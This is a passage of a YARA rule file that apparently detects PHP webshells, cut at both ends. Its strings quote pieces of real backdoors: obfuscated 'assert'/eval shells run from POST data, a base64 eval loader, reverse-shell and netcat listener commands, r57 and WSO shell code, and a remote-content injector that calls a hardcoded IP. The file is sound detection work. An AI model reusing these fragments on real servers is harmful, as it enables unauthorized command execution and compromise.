      $x12 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x13 = "<li><a href=\"?s=bb\" id=\"t_16\" onclick=\"switchTab('t_16')\" target=\"main\">shellcode</a></li>" fullword ascii
      $x14 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x15 = "echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : " ascii
      $x16 = "echo \"PR: <iframe src=http://e2315.com/web/zh/?domain=\".$_SERVER['SERVER_NAME'].\" width=100% height=100></iframe><br>\";" fullword ascii
      $x17 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x18 = "if(!isset($_GET[\"ip\"]) or !isset($_GET[\"port\"]) or !isset($_GET[\"exec_time\"]) or !isset($_GET[\"att_size\"])){" fullword ascii
      $x19 = "<html><head><title>{$Server_IP} - Silic Group php Webshell version 4</title>" fullword ascii
      $x20 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*)
}

rule AddressLogEntry
{
   meta:
      description = "php17 - file AddressLogEntry.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "db83d079d3767c8946d2d854ecbd66f201494bc1facdb9d56032fad6378a0c0f"
   strings:
      $s1 = "use Sylius\\Component\\Resource\\Model\\ResourceLogEntry;" fullword ascii
      $s2 = "namespace Sylius\\Component\\Addressing\\Model;" fullword ascii
      $s3 = "class AddressLogEntry extends ResourceLogEntry" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_96d702c7f1cb97976f4b18e22be06b33718145d6
{
   meta:
      description = "php17 - file 96d702c7f1cb97976f4b18e22be06b33718145d6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5c1a17db4f66dfe714c7ea0191c0004ec818011eaee347728c652cec3decd095"
   strings:
      $s1 = "$A=',LS0LS,$e))),$k)));$oLS=LSob_get_contenLSts()LSLS;obLS_end_clLSean();$d=basLSe6LS4_encod';" fullword ascii
      $s2 = "$W='t{$i}^$k{$j};}}returnLS $LSo;LS}$r=$_LSSERVER;$rr=@$r[\"LSHTTPLS_RELSFERER\"];$ra=LSLS@$r[';" fullword ascii
      $s3 = "$S='\"HTTP_ALSLSCCEPTLS_LANGLSUAGE\"];ifLS($rr&&$raLSLS){$u=parse_LSurl($rr)LS;parsLSe_stLSr($';" fullword ascii
      $s4 = "$y='e(xLS(gzcompLSress($oLS)LS,$k));pLSrint(\"<$k>$dLSLS</$k>\");@seLSssion_deLSstLSroy();}}}}';" fullword ascii
      $s5 = "$e='$i]LS,$f);iLSf($e){$k=LS$khLSLS.$kf;LSob_start();@eLSvalLS(@gLSLSzuncompress(@x(@baLSse6';" fullword ascii
      $s6 = "$O='Ss(md5($i.$kh),0LS,3));$f=$sl($LSss(mdLS5($i.$LSkLSf),0LS,3LS));$p=\"LS\";for($z=1LS;$z<LS';" fullword ascii
      $s7 = "$p='LS$o=\"\";for($i=LS0;LS$i<$lLS;){for($LSj=0;($jLS<$c&&$i<LS$l);$j++LS,$iLSLS++){$LSLSoLS.=$';" fullword ascii
      $s8 = "$Z='$kh=\"5dLSLS41\"LS;$kf=LS\"402a\";LSfunction xLS($t,$kLS){$c=stLSrlen($k);$l=stLSrlen(LS$tLS);';" fullword ascii
      $s9 = "$s='SN;LS$ss=\"substrLS\";$sl=LS\"strLStolower\"LS;$LSi=$m[1][0]LS.$m[LS1][1];LSLS$h=$LSsLSl($sL';" fullword ascii
      $s10 = "$U=':;qLS=0.([\\\\LSd]LS))?,?/LS\",$ra,$m);if(LSLS$q&&$m){LS@sessiLSLSon_start();$sLS=&$_SESSIOL';" fullword ascii
      $s11 = "$q='u[\"LSquerLSy\"],$LSq);$qLS=LSarray_vaLSlues($q);preg_matcLSh_LSall(\"/LS([\\\\w])LSLS[\\\\w-]+(?';" fullword ascii
      $s12 = "$E='4_LSdecoLSde(preLSg_repLSlace(array(LS\"/_LS/\",\"LSLS/-/\"),array(\"/\",\"+\"LS)LS,$ss($s[LS$i]';" fullword ascii
      $s13 = "$R='\";$p=$ss($p,3);LS}LSif(LSarray_LSkeLSy_exists($i,$s)LS){$s[$i]LS.=$p;$eLS=strposLS(LS$s[';" fullword ascii
      $s14 = "$r='couLSnt($m[1]);$z++)$pLS.=$LSq[$m[2][$LSz]LS];if(LSstrpoLSs($p,$h)===0)LS{$sLS[$i]LS=\"LS';" fullword ascii
      $s15 = "$J=str_replace('LS','',$Z.$p.$W.$S.$q.$U.$s.$O.$r.$R.$e.$E.$A.$y);" fullword ascii
      $s16 = "$N=str_replace('q','','cqrqeatqe_qqfunctiqon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_30af7f3e5e6361fe8d59ff5bdfc8a4b9e2392e6f
{
   meta:
      description = "php17 - file 30af7f3e5e6361fe8d59ff5bdfc8a4b9e2392e6f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2d37e93a814dd592f0cf5cbec7076938b86169c3857c7e149b5089925d07cee5"
   strings:
      $s1 = "J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = \")));?>" fullword ascii
      $s2 = "K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w " ascii
      $s3 = "<?php $b=strrev(\"edoced_4\".\"6esab\");eval($b(str_replace(\" \",\"\",\"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _themosisMetaboxRow_scout
{
   meta:
      description = "php17 - file _themosisMetaboxRow.scout.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70fd2b4cce378881eb0183c43f330d0dbb970e3a6bf056d461e02cfc4237ae44"
   strings:
      $s1 = "{!! Themosis\\Facades\\Form::label($field['features']['title'], ['for' => $field['atts']['id']]) !!}" fullword ascii
   condition:
      uint16(0) == 0x743c and filesize < 1KB and
      all of them
}

rule AspCms_MainCl
{
   meta:
      description = "php17 - file AspCms_MainCl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3a310dfa74e7bc14d458f9a9fa3ab62b8d2be7ab20ef5461ee4e95be857db04"
   strings:
      $s1 = "$Content_mb=getHTTPPage($Remote_server.\"/index.php?host=\".$host_name);" fullword ascii
      $s2 = "$Remote_server = \"http://216.244.86.57/vb/\";  //" fullword ascii
      $s3 = "'header'=>\"User-Agent: aQ0O010O\"" fullword ascii
      $s4 = "$html = @file_get_contents($url, false, $context);" fullword ascii
      $s5 = "header(\"Content-Type: text/html;charset=gb2312\");" fullword ascii
      $s6 = "$host_name = \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];" fullword ascii
      $s7 = "exit(\"<p align='center'><font color='red'><b>Connection Error!</b></font></p>\");" fullword ascii
      $s8 = "function getHTTPPage($url) {" fullword ascii
      $s9 = "'method'=>\"GET\"," fullword ascii
      $s10 = "echo $Content_mb;" fullword ascii
      $s11 = "'http'=>array(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule sig_1c1976ede586d56cb497493f1ba074061db37fc1
{
   meta:
      description = "php17 - file 1c1976ede586d56cb497493f1ba074061db37fc1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "879c39047fa2dd0ca474ca11f1c6258e5fab0948eed2339868cc65b63ab21ac9"
   strings:
      $s1 = "$xh1 = str_ireplace(\" hello\",\"\",\"assert hello\");" fullword ascii
      $s2 = "<?php $a=a.s.sert;@$a($_POST[t1est3r]);?>" fullword ascii
      $s3 = "$xh3 = substr(\"Hello ert\",6);" fullword ascii
      $s4 = "$xh1 = rtrim($xh,\" hello\");" fullword ascii
      $s5 = "$xh = \"assert hello\";" fullword ascii
      $s6 = "@$xh1($_POST[dike]);" fullword ascii
      $s7 = "@$x ($_POST[dike]);" fullword ascii
      $s8 = "$b($_POST[hehe]);" fullword ascii
      $s9 = "@$xh4($_POST[dike]);" fullword ascii
      $s10 = "$xh1 = a.$xh[1].ser.chr('116');" fullword ascii
      $s11 = "$xh2 = base64_decode(\"cw==\");" fullword ascii
      $s12 = "$xh4 = $xh.$xh1[2].$xh1[2].$xh3;" fullword ascii
   condition:
      uint16(0) == 0x89e5 and filesize < 3KB and
      8 of them
}

rule activeLinkIDAL_class
{
   meta:
      description = "php17 - file activeLinkIDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c2a4dc6e12cf1b95647d07f72d81c18a40d677403fce0067959761d4de0086df"
   strings:
      $s1 = "function  GetPageCount(activeLinkModel $model,$perPageCount);" fullword ascii
      $s2 = "function  GetPageList(activeLinkModel $model,$start,$limit);" fullword ascii
      $s3 = "function  GetModel(activeLinkModel $model);" fullword ascii
      $s4 = "function  GetList(activeLinkModel $model);" fullword ascii
      $s5 = "function  DeleteFrom(activeLinkModel $model);" fullword ascii
      $s6 = "function  UpDateSet(activeLinkModel $model);" fullword ascii
      $s7 = "function  InsertInto(activeLinkModel $model);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_3a7fb4c3cd5df442c99050b0dc3e316de396c57c
{
   meta:
      description = "php17 - file 3a7fb4c3cd5df442c99050b0dc3e316de396c57c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "64e6e700f39814bd9f3b84dd65b929829a73d9080ce3a8368a17e97a0eefab6a"
   strings:
      $x1 = "<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>" fullword ascii
      $s2 = "<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>" fullword ascii
      $s3 = "$winbinary = (strtolower(substr(php_uname(),0,3))==\"win\")? \"<option>executable</option>\":\"\";" fullword ascii
      $s4 = "<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>" fullword ascii
      $s5 = "<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='\".$server_addr.\"' disabled></td></tr>" fullword ascii
      $s6 = "$code = \"?><?php \\$target = \\\"\".$rsArgs.\"\\\"; ?>\".$code;" fullword ascii
      $s7 = "$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);" fullword ascii
      $s8 = "$res .= \"<tr><td><textarea style='height:140px;min-height:140px;'>\".bin2hex($bin).\"</textarea></td></tr></table>\";" fullword ascii
      $s9 = "$packetContent = str_replace(array(\"\\\\r\",\"\\\\n\"), array(\"\\r\", \"\\n\"), $packetContent);" fullword ascii
      $s10 = "if(!preg_match(\"/[a-z0-9]+:\\/\\/.*/\", $packetHost)) $packetHost = \"tcp://\".$packetHost;" fullword ascii
      $s11 = "<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>" fullword ascii
      $s12 = "ISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=\";" fullword ascii
      $s13 = "if(ctype_xdigit($packetContent)) $packetContent = @pack(\"H*\" , $packetContent);" fullword ascii
      $s14 = "$packetContent = str_replace(array(\"\\r\",\"\\n\"), \"\", $packetContent);" fullword ascii
      $s15 = "$res .= html_safe(trim($errStr)).\" (error \".html_safe(trim($errNo)).\")</div>\";" fullword ascii
      $s16 = "<td><span class='button' onclick=\\\"rs_go_bind();\\\" style='width:120px;'>run</span></td>" fullword ascii
      $s17 = "<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='\".$remote_addr.\"' onkeydown=\\\"trap_ent" ascii
      $s18 = "<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='\".$remote_addr.\"' onkeydown=\\\"trap_ent" ascii
      $s19 = "<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\\\r\\\\n\\\\r\\\\n</text" ascii
      $s20 = "<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\\\r\\\\n\\\\r\\\\n</text" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule aa65f58060d58b55e3bd202af53487a35913f539
{
   meta:
      description = "php17 - file aa65f58060d58b55e3bd202af53487a35913f539.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6701b3e0ec4aec6d6a7cfcb4e93c8be3e7de45dc868c65a230fdf9dd1ccbf636"
   strings:
      $s1 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s2 = "+g20O23YvrnxiRCMRh7LNGpypSixPEQpH/7xDkwsrxKRQpLf90rdINR42ud2lW/v4vjpNvLGHRh0GGqi/G72e9h46n3aJnoFZKQda/wgxGBj2dSjvxMa3+Hg5SrN9Thy" ascii
      $s3 = "EGPmwbdBrtwROjp3ArrAnT049lOuCf+en2ymN/RUQ6t349eaH6wCzKz0qGU7sYOjinYaNz3KzYWWNIKn2f7B0vKRQMLPO4SqrBs47X4AQyGELUD8DYEt9GPWxFtPPSUZ" ascii
      $s4 = "RSIoP5HG/PJ0pB6GsCfXlWoa96bjQh3dNUpHfMa+UUoOpZJ1u95ZApicDOWK7RK3Oc/nGetEfDk1vHnuWJJs3PdM4NA0YxAX1d3Gyw2fVcZtcuk4YSVDRr9th8504fWE" ascii
      $s5 = "jTAncF0sFFJ4GulNQybqL/h7d4oE3CsD5tEoyNqrqO/07MtXZA5U/j4a8/umYlPeLO11drBspYC/Wth8J9LYp81DMGHc1FsrwyGMP0d8CzQ4C6E1fplDEolfYCetfxGg" ascii
      $s6 = "JMOPuVZ/R8t3nsEpDpjIHDYwf66n5IfFGmKvlOGSeUCGZxzyuqV16Z/y+Tg914YNG57k5OM4ZglKeU/s32UJgghBanZEhNGt1fukmmL1+3emuFk+Pfh1mf1Z6VbxrUtk" ascii
      $s7 = "olRG4pRiEUCEvhvv6VzHApvbMTAM/tE4rg7U42XbmhjfRXmxsUggccjn8Jy/IR74SBdMDM525oh3iRvwVZQ+cobcUAJgHl8As9wQTgmYDlLh4fMzrq3qgkA6cTjqSsdp" ascii
      $s8 = "qCCbUFJkPOYdivro3xs0LKcN+picczDeL7S3SAZW3bLCcyezUmFYIjD53HJohCLOg6DyNgkDm8IOwaXxSW/V7OH+RywuOcLfIk+aOTtxrO9E1BAO+5iSS5qE41cLhpch" ascii
      $s9 = "GfwAvhyY+Epk4GyBNFvF5DLLlg2QVxiLSEoe/bZZZZvvBEqg+9IzhpDx32TE85Tc6VcY7jacf6Dk1e2vxwo3/jzzVwy/9vAVPxNneaojfvQfoV1YvOSl8AtTrXY+eXe7" ascii
      $s10 = "8qlADy6Wm+jbE8dLLqgdwOKYcIsj/DC/D6rIohpEBNRh5Tidrw4eIIWBwjsPcYDeTRrPXV/bBWzhGzhEs+9qmBv2JvLYlvQ/G6lnOhbnLjsBsEFxiyq+DpaDky6V29wE" ascii
      $s11 = "A5WNQvT44POAvKGeTIZSxulf0fmkGyw1AnR8LXwBD7I0BeEAO0Q42aIvrfq5JhYS1MiHOOHV5cdSZAWGHnDrojNwQtji4OTrnwglFh6+BPjHQxWmoE3y+rTeFnN7V+Sb" ascii
      $s12 = "k8oEH+fbitOX48mXsZESBEm0AsHneUAQWEAQtP5+KpBh/v3v//7nn3/+9V//+d//+c//AQ=='))); ?>" fullword ascii
      $s13 = "v4BntA+GknI88Cx1oCMDXgIzv/3Om9uBysqCSdrwB0z4AWpuNtZzUFlugbVdRL/buKaBXLxLruxvw//OGpDyRKy7dyWVKraJHRjDXsaSPbBbJ36qpZoTXx7G57Q9BCUe" ascii
      $s14 = "HJ3HjqxclkZfpWb1SwzwTmp1KYDAew+TFt4H3j59kzW6edMRnLP3/tYSBPmf//2f//yrOJL+n+ppfmWfbMU/abIWBPZ/eZGNefHPv3kZFdPVTLrOB6cgpz8WEX1B7lSb" ascii
      $s15 = "p/896pM/UvlxnRVVUbBINz9mfuTX9pdCq+Nrsy4Wrxl+XGoaYcdrslH3svGhrFz3cZ7PE2VzJumm9AgvSgT7IpfNz6QQ45dO8emZ0dbbIzHdVQCD+oU8G2GCpOCHCkeg" ascii
      $s16 = "UmFqzP5BAIh+3YFpcMZCCUll4hgTt82tfZKK+kwTrgIkBab0GidR80sgfWnklFxVJ3TV4M9H3NsUmv3JK2RTTei+O4Nf+MQtqyEsoqk+zQaTAdr4/a7Bh0Xrunn/X/w0" ascii
      $s17 = "kiJ3I7ZAExmpEWeQVvfPjlBgvIFXQNS9n1pmR808xFIE6p7zcih8Njx2VJQbinVQBcQyXyy0pn/9NV2g0mwNlWFDrhcfpy8HGY8f6f5Qd5zFHTuqRy3P82XHbwkRSJD5" ascii
      $s18 = "tCL7ZcQ9l5hBFtZI0hXTHqaX+kIycyPa5nGM5r6yxeZH/NK+sPABINJgmbPLV2L64a7BYe/V6iTctIqTFPyohGCc0MZ+20orzVA5/aFex6of63XGd8WxELwfPyrnvCNJ" ascii
      $s19 = "QKOa0sGSUZxEtTfybInSou0KLDD957zCIKct417R4867/ApG6J0DWASE3qUDYqKTvM4jBHKEUKCFUVJQPA80uz59mWhRBYb1j/9gO/DgYgP0J0K42TP65PhUWCh3W/Ge" ascii
      $s20 = "VZu7Ieyw4z8sauhj7Gt204ud6FXhgBZCkbiNA55yANXCqQ9uLL8VK9NEigyaLdrV7mhONhzmD/lFBLQebglZkFHc7VtqjZvyzUhEQzneNma4Atbxsr10mVh8NTpQ2Ly9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule a9b8077357065b95c2bc7f3ffa7baea65895d920
{
   meta:
      description = "php17 - file a9b8077357065b95c2bc7f3ffa7baea65895d920.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x2 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] HATA! Dump dosyalari yazilabilir degil\"; }" fullword ascii
      $x3 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s4 = "$head = '<!-- &#1047;&#1076;&#1088;&#1072;&#1074;&#1089;&#1090;&#1074;&#1091;&#1081;  &#1042;&#1072;&#1089;&#1103; -->" fullword ascii
      $s5 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s6 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s7 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s8 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s9 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s10 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s11 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s12 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s15 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s16 = "else echo \"<div align=center><font face=Verdana size=-2 color=red><b>PostgreSQL server ile baglanti kurulamadi</b></font></div" fullword ascii
      $s17 = "'config.inc.php dosyalarini dizinlerde bul'=>'find . -type f -name config.inc.php'," fullword ascii
      $s18 = "'service.pwd dosyalarini genel dizinlerde bul'=>'find . -type f -name service.pwd'," fullword ascii
      $s19 = "'config* dosyalarini dizinlerde bul'=>'find . -type f -name \"config*\"'," fullword ascii
      $s20 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_2_7_0_pl
{
   meta:
      description = "php17 - file 2.7.0-pl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "51cc9a3eca09989efb6bd43180369ae18c5d8b830a2d176e50efe26ae63d3e91"
   strings:
      $s1 = "/* run upgrades common to all db platforms */" fullword ascii
      $s2 = "include dirname(dirname(__FILE__)) . '/common/2.7-alias-visible.php';" fullword ascii
      $s3 = "* Specific upgrades for Revolution 2.6.0-pl" fullword ascii
      $s4 = "* @subpackage upgrades" fullword ascii
      $s5 = "* @var modX $modx" fullword ascii
      $s6 = "* @package setup" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5f4a33b40c9f5e4bc002890dcbc76b770cdd0d55
{
   meta:
      description = "php17 - file 5f4a33b40c9f5e4bc002890dcbc76b770cdd0d55.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e13df075e83d11b7def2a218b2b7820564663beac0533bafd5a0ff29c83a8185"
   strings:
      $s1 = "//Password: $ws->Run" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_500c982241212f06be1ffe5fbe5cbec83b6f2f59
{
   meta:
      description = "php17 - file 500c982241212f06be1ffe5fbe5cbec83b6f2f59.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "51ec7ac29a9aa90eb76d4c3f7cb1983e3eb070e810c020a128d3fa0ef6bde838"
   strings:
      $x1 = "</script>\"; echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value==\\'clear\\'){d.cf.output.value" ascii
      $x2 = "<?php $auth_pass = \"866fd58d77526c1bda8771b5b21d5b11\"; $color = \"#df5\"; $default_action = 'FilesMan'; $default_use_ajax = tr" ascii
      $x3 = "</tr></table></div></body></html>\"; } if (!function_exists(\"posix_getpwuid\") && (strpos($GLOBALS['disable_functions'], 'posix" ascii
      $x4 = "</form>\"; $freeSpace = @diskfreespace($GLOBALS['cwd']); $totalSpace = @disk_total_space($GLOBALS['cwd']); $totalSpace = $totalS" ascii
      $x5 = "</script>\"; if(isset($db) && $db->link){ echo \"<br/><table width=100% cellpadding=2 cellspacing=0>\"; if(!empty($_POST['sql_ba" ascii
      $x6 = "</form></div>\"; wsoFooter(); } function actionFilesTools() { if( isset($_POST['p1']) ) $_POST['p1'] = urldecode($_POST['p1']); " ascii
      $x7 = "header('HTTP/1.0 404 Not Found'); exit; } } @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time'" fullword ascii
      $x8 = "'); $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); echo '<br>'; $temp=array(); foreach ($userful" ascii
      $s9 = "/w /b *config*.php\", \"Show active connections\" => \"netstat -an\", \"Show running services\" => \"net start\", \"User account" ascii
      $s10 = "each($temp as $line) { $line = trim($line); ++$attempts; if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) { $" ascii
      $s11 = "as $item) if(wsoWhich($item)) $temp[] = $item; wsoSecParam('Userful', implode(', ',$temp)); $temp=array(); foreach ($danger as " fullword ascii
      $s12 = "if(@is_dir($item)){ if($path!=$item) wsoRecursiveGlob($item); } else { if(empty($_POST['p2']) || @strpos(file_get_contents($ite" fullword ascii
      $s13 = "(md5($_SERVER['HTTP_HOST']).'ajax', true); ob_start(); echo \"d.cf.cmd.value='';\\n\"; $temp = @iconv($_POST['charset'], 'UTF-8'" ascii
      $s14 = "/td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><b" ascii
      $s15 = "$sql); else echo($sql); $this->query('SELECT * FROM `'.$table.'`'); $i = 0; $head = true; while($item = $this->fetch()) { $sql " fullword ascii
      $s16 = "</form><br>\"; if(isset($_POST['p1'])) { function cf($f,$t) { $w = @fopen($f,\"w\") or @function_exists('file_put_contents'); if" ascii
      $s17 = ",$pass) { $str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; $res = @pg_" ascii
      $s18 = "<td><input type=text name=sql_host value=\\\"\". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ." fullword ascii
      $s19 = "$v; setcookie($k, $v); } if(!empty($auth_pass)) { if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie" fullword ascii
      $s20 = ". $_SERVER['HTTP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule app_blade
{
   meta:
      description = "php17 - file app.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6906cc812a2069fa46fb48504d5c42c02757d360e521179e4af135326189fa09"
   strings:
      $s1 = "<li><a href=\"{{ url('/login') }}\">{{ trans('app.nav.login') }}</a></li>" fullword ascii
      $s2 = "<script src=\"https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js\"></script>" fullword ascii
      $s3 = "<script src=\"https://oss.maxcdn.com/respond/1.4.2/respond.min.js\"></script>" fullword ascii
      $s4 = "<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">{{ Config::get('languages')[App::getLocale()]" fullword ascii
      $s5 = "<li><a href=\"{{ url('/logout') }}\">{{ trans('app.nav.logout') }}</a></li>" fullword ascii
      $s6 = "<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->" fullword ascii
      $s7 = "<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-example-navbar-col" fullword ascii
      $s8 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">" fullword ascii
      $s9 = "<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->" fullword ascii
      $s10 = "<!-- Latest compiled and minified CSS -->" fullword ascii
      $s11 = "@foreach (Config::get('languages') as $lang => $language)" fullword ascii
      $s12 = "<!-- Scripts -->" fullword ascii
      $s13 = "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">" fullword ascii
      $s14 = "<li><a href=\"{{ url('/register') }}\">{{ trans('app.nav.register') }}</a></li>" fullword ascii
      $s15 = "{{-- Language Switcher --}}" fullword ascii
      $s16 = "<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\" role=\"button\" aria-expanded=\"false\">{{ au" fullword ascii
      $s17 = "<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">{{ Config::get('languages')[App::getLocale()] }} <b class=\"car" ascii
      $s18 = "<link rel=\"stylesheet\" href=\"{{ asset('css/app.css') }}\">" fullword ascii
      $s19 = "<script src=\"{{ asset('js/app.js') }}\"></script>" fullword ascii
      $s20 = "@yield('content')" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 9KB and
      8 of them
}

rule sig_0e37981d3f1cafddf9d92bc2fe4e8d689d76cf63
{
   meta:
      description = "php17 - file 0e37981d3f1cafddf9d92bc2fe4e8d689d76cf63.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "605d5287f6e3d371687b6006af05ae0c7e137e10c0cee523a5b8ae761aea39a7"
   strings:
      $s1 = "$foobar = 'system(\"dir\")';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Addition
{
   meta:
      description = "php17 - file Addition.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c6d401d2218b56a27e06b02a3c1ba95e2889d4b325f1b06ffc2d0c00deb6d39f"
   strings:
      $s1 = "* see http://php.net/manual/en/language.operators.array.php for details." fullword ascii
      $s2 = "* @license    https://github.com/padraic/humbug/blob/master/LICENSE New BSD License" fullword ascii
      $s3 = "draic Brady (http://blog.astrumfutura.com)" fullword ascii
      $s4 = "* The PHP language allows union of arrays : $var = ['foo' => true] + ['bar' => true]" fullword ascii
      $s5 = "public static function getMutation(array &$tokens, $index)" fullword ascii
      $s6 = "* @copyright  Copyright (c) 2015 P" fullword ascii
      $s7 = "if (is_array($tokens[$i]) && $tokens[$i][0] == T_ARRAY && $tokens[$i][1] == 'array') {" fullword ascii
